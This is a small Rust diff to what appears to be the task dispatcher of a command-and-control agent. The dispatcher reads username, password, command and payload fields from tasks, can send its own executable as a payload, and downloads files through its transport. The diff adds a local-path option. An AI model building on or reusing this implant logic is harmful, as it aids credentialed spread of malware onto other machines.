@@ -1323,6 +1323,7 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
             let user         = j["user"].as_str().unwrap_or("").to_string();
             let pass         = j["pass"].as_str().unwrap_or("").to_string();
             let cmd          = j["cmd"].as_str().unwrap_or("").to_string();
+            let json_local   = j["local_path"].as_str().unwrap_or("").to_string();
             let payload_name = j["payload"].as_str().unwrap_or("").to_string();
             let (data, local_path): (Vec<u8>, String) = if payload_name.eq_ignore_ascii_case("self") {
                 let self_path = std::env::current_exe().unwrap_or_default();
@@ -1332,6 +1333,8 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
                 (t.download_file(&payload_name), String::new())
             } else if !cmd.is_empty() {
                 (std::fs::read(&cmd).unwrap_or_default(), cmd.clone())
+            } else if !json_local.is_empty() {
+                (vec![], json_local.clone())
             } else {
                 (vec![], String::new())
             };
